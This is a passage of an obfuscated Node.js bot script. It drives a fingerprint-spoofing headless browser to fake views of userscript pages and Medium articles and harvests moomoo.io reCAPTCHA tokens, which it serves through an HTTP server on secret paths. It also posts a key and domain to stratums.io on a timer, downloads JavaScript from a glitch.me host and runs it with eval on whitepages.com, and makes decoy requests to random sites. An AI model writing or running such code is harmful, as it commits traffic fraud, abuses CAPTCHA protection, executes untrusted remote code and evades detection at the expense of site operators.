    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + Y(0x4) + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + X(0x8) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + W(0x1, 'icXe') + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + X(0x17) + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + X(0x6) + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + W(0xd, 'oYN8') + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + W(0x9, '6R9v') + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x3d * 0x19 + -0x1 * 0x1d75 + 0x1780
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0x2dc + -0x4 * -0x5c1 + -0x1cbc)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xdd9 + -0x313 + 0x1bb * -0x6), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xcfb * 0x1 + 0x5 * 0x719 + -0x3014), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * -0x1343 + -0x168c + 0x3cd * 0xb;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1da6 + 0xbd + -0x1e63; w < getRandomInt(-0x1977 + 0x1b55 * 0x1 + -0x1dd, 0x1c1e + 0x322 * 0x8 + -0x1b7 * 0x1f); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xc78e + -0xf58d + 0x1d * 0x9ab);
        }
      }();
    }, 0x28f * -0x7 + -0x1 * 0xb8f + -0x27 * -0xc4), doFlags['doRemoteCa' + Z(0x15)] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x3 * 0x9c5 + 0xad6 + -0x1279 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x10 * -0x201 + 0x24f2 + 0x323 * -0x16, 0xf * -0x1f0 + -0x5 * 0x29f + 0x2a5d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x6335 + 0x4d9 * 0x2b + -0x12 * -0x71);
    }, -0x1764 + -0x13 * -0x129 + -0x5 * -0x59), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x1850 + 0x229f + 0x1 * -0xa4f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x186a + -0xa7b + -0x237), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x3 * -0x20e + 0x1e * -0xbf + 0x2 * 0xe46), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x2 * -0x2f8df + -0x1 * 0x1491dc + 0x283f3a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xfe8 + 0x1a * 0xb3 + -0x21b2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1ee5 + 0x1 * 0x12d1 + -0x30ee);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2f + 0x2bfe + -0xc9d * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d;
  async function f() {
    const a1 = c,
      a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', a0(0xb, '&5%i')) + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x6f1 * -0x4 + -0x53 * 0x5 + 0x1d64) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xc29 + -0x16e5 + 0x230f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x43 * -0x68 + 0x9ea + 0x5 * 0x376, D['indexOf']('\x20'));
        return B ? E['slice'](0x1e65 + 0x1 * 0x39e + -0x2203, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * 0xf4e + -0x4e9 + 0x25f * 0x19),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2387 * -0x2 + 0xab6 + 0x6368 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y[a1(0x14)], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + a2(0x12)
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * -0x3e2 + 0xa61 + -0xe43 * 0x1; k < -0x50c + 0x99 * 0xb + -0x183; k++)
    setTimeout(f, (-0x5 * 0xae0 + 0x548 * 0x2e + 0x4 * 0xb74) * k * getRandomInt(0x2592 * 0x1 + 0x248f * 0x1 + 0x4a20 * -0x1, 0x25f8 + 0x2 * -0xab3 + -0x585 * 0x3));
  setInterval(() => {
    f();
    for (let l = -0x77a + -0x14f6 + 0x5b0 * 0x5; l < 0x1 * 0xa0d + -0x21f8 + 0x17ef; l++)
      setTimeout(f, (-0xb85d * -0x1 + 0x1 * -0x71e2 + 0xa3e5) * l * getRandomInt(-0x15c1 + -0x4cf * 0x1 + 0x1a91 * 0x1, -0xf7 + -0x13 * 0x1f0 + 0x566 * 0x7));
  }, -0x634737 + -0x117626 + -0x1 * -0xababdd);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
